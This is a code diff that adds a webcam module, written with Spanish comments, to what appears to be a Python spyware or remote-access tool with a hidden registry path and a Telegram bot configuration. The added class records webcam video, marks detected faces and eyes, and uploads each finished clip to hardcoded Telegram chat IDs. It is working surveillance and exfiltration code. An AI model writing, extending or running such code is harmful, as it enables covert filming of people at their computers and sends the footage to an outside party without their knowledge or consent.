@@ -627,6 +627,101 @@ class PCInformation:
                     init()
                     time.sleep(200)
 
+class WebCam_IA:
+    def __init__(self):
+        self.frontalFacePath = "haarcascade_frontalface_default.xml"  # Archivo clasificador
+        self.eyesPath = "haarcascade_eye.xml"  # Archivo clasificador
+        self.path_video = Config().TEMP + r"\video_"
+        self.extension = ".mp4"
+
+    def __get_capture_webcam(self):
+        try:
+            print('Tratando de obtener WebCam [0]')
+            return cv2.VideoCapture(0)
+        except:
+            try:
+                print('Tratando de obtener WebCam [1]')
+                return cv2.VideoCapture(1)
+            except:
+                pass
+            print('No se puedo obtener ambas camaras')
+            return False
+
+    def __trained_file_face(self):
+        try:
+            return cv2.CascadeClassifier(self.frontalFacePath)
+        except:
+            return False
+
+    def __trained_file_eyes(self):
+        try:
+            return cv2.CascadeClassifier(self.eyesPath)
+        except:
+            return False
+
+    def upload_video(self, name):
+        bot = telepot.Bot(Config.TelegramBot().TOKEN)
+        for id in Config().TelegramBot().ID:
+            try:
+                bot.sendChatAction(id, 'upload_photo')
+                bot.sendVideo(id, open(name, 'rb'))
+                # bot.sendDocument(id, open(Config().Screenshot().PATH + name, 'rb'))
+                print("[SEND WebCam] Send Video to: [ID] " + str(id)) if Config().DEBUG else False
+            except:
+                print("[SEND WebCam Video] there was a mistake when sending the [ID] " + str(
+                    id)) if Config().DEBUG else False
+
+    def start(self):
+
+        faceClassif = self.__trained_file_face()
+        eyesClassif = self.__trained_file_eyes()
+        num = 1
+        def init(num):
+            videoPath = self.path_video + str(num) + self.extension
+            cap = cv2.VideoCapture(0)  # self.get_capture_webcam()
+            outVideo = cv2.VideoWriter(videoPath, cv2.VideoWriter_fourcc(*'FMP4'), 20.0, (int(cap.get(3)), int(cap.get(4))))
+            if cap != False and faceClassif != False and eyesClassif != False:
+                while cap.isOpened():
+                    ret, frame = cap.read()  # Obtiene frames // ret == true si hay video
+                    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
+                    faces = faceClassif.detectMultiScale(gray,
+                                                         scaleFactor=1.05,  # original 1.3,  # Reducción de imagen
+                                                         minNeighbors=5)  # 5    # Espeficica el número mínimo de cuadros delimitadores
+                    eyes = eyesClassif.detectMultiScale(gray,
+                                                        scaleFactor=1.05,
+                                                        minNeighbors=5)
+                    if ret == True:
+                        for x, y, w, h in faces:
+                            cv2.rectangle(frame,
+                                          (x, y),
+                                          (x + w, y + h),
+                                          (0, 0, 255),
+                                          2)  # original 2
+                        for x, y, w, h in eyes:
+                            cv2.rectangle(frame,
+                                          (x, y),
+                                          (x + w, y + h),
+                                          (0, 255, 0),
+                                          2)  # original 2
+
+                        cv2.imshow('WebCam IA detecction', frame)
+                        outVideo.write(frame)
+                        if os.path.getsize(videoPath) >= 1000000:
+                            outVideo.release()
+                            print('Se detuvo el video con nombre: ' + videoPath )
+                            self.upload_video(videoPath)
+                            num = num +1
+                            init(num)
+                            break
+                        print(os.path.getsize(videoPath))
+                        #if cv2.waitKey(1) & 0xFF == ord('q'):
+                        #    break
+                cap.release()
+                #outVideo.release()
+                cv2.destroyAllWindows()
+            else:
+                print('No se puedo acceder a la webcam o al archivo entrenado')
+        init(num)
 if __name__ == '__main__':
     folders = [
         # str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('path')),
